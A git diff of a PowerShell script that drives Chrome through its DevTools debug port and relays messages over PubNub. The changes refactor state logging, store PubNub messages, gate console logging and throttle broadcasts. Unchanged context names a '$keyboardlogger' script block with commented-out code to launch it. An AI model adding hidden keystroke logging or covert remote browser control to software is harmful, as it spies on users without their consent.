@@ -369,7 +369,8 @@ class PSCDP {
     $responses = [System.Collections.Generic.List[object]]::new()
     $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $results = [System.Collections.Generic.List[object]]::new()
-    $errors = [System.Collections.Generic.List[object]]::new() # TODO not implemented yet
+    $errors = [System.Collections.Generic.List[object]]::new() 
+    $pubnubmsgs = [System.Collections.Generic.List[object]]::new()
 
     [int32]$messageId = 1
     $receiveNew = $true
@@ -388,6 +389,8 @@ class PSCDP {
     $sessionId = $null
     $initpage = $null
 
+    $logconsolemsg = $false
+
     [void] CheckSocket() {
 
         if ( $this.IsSocketHealthy() ) {
@@ -402,11 +405,6 @@ class PSCDP {
             throw 'websocket is not open'
         }
         
-        try {
-            Log-Msg "system state -- sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count) results: $($this.results.Count) errors: $($this.errors.Count)"
-        } catch {
-            Log-Msg "could not produce system overview message"
-        }
     }
 
     [bool] IsSocketHealthy() {
@@ -785,17 +783,22 @@ class PSCDP {
             if ( $bindingCalled ) {
                 if ( $msght['params'].name -eq "onPubNubEvent" ) { # $msght['params'].payload
                     Log-Msg "processing incomming PubNub event"
+                    $this.pubnubmsgs.Add($msght)
                     $payload = $msght['params'].payload # works - able to receive pubnub messages from browser
                     Process-PubNubEvent -Message $payload
                     # name = onPubNubEvent
                     # payload = "{"type":"message 1234","message":{"msgstr":"test 41234 10:11:46.449"}}"
-                }
+                } # $pubnubmsg
             }
 
             if ( $consoleAPICalled ) {
                 $msghtstr = $msght.GetEnumerator() | ForEach-Object { "{0}={1}" -f $_.Key, $_.Value } | Out-String
-                Log-Msg $msghtstr 
-                Log-Msg ($msght['params'].args | Out-String)
+                
+                if ( $this.logconsolemsg ) {
+                    Log-Msg $msghtstr 
+                    Log-Msg ($msght['params'].args | Out-String)
+                }
+
             }
 
 
@@ -924,6 +927,14 @@ class PSCDP {
         $this.SendPBMessage($cmd) # TODO change this to send a hashtable, with builtincmd: SendBroadcast, etc.
 
     }
+
+    [void] LogState() {
+        try {
+            Log-Msg "system state -- sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count) results: $($this.results.Count) errors: $($this.errors.Count)"
+        } catch {
+            Log-Msg "could not produce system overview message"
+        }        
+    }
 }
 
 $script:clientws = [PSCDP]::new($script:chrome_debugport)
@@ -949,10 +960,14 @@ $keyboardlogger = {
 # $ps = [powershell]::Create().AddScript($keyboardlogger)
 # $asyncResult = $ps.BeginInvoke()
 
+$d = 200
+$n = 10
+$i = 0
 while ( $true ) {
 
     Log-Msg "new iteration"
 
+    $script:pubnubws.LogState()
     $script:pubnubws.CheckSocket() # report basic statistics: number of messages sent, received, errors, responses, results, etc.
 
     $script:pubnubws.InitReceive()
@@ -962,10 +977,13 @@ while ( $true ) {
     $script:pubnubws.ExecCallbacks()
     $script:pubnubws.NextCmd()
 
-    $script:pubnubws.Broadcast()
+    if ( $i -ge $n ) {
+        $script:pubnubws.Broadcast()
+        $i=0
+    }
 
     # ---
-
+    # $script:clientws.LogState()
     $script:clientws.CheckSocket()
 
     $script:clientws.InitReceive()
@@ -978,6 +996,7 @@ while ( $true ) {
     Log-Msg "...sleeping"
 
     Start-Sleep -Milliseconds 200
+    $i++
 }
 
 exit
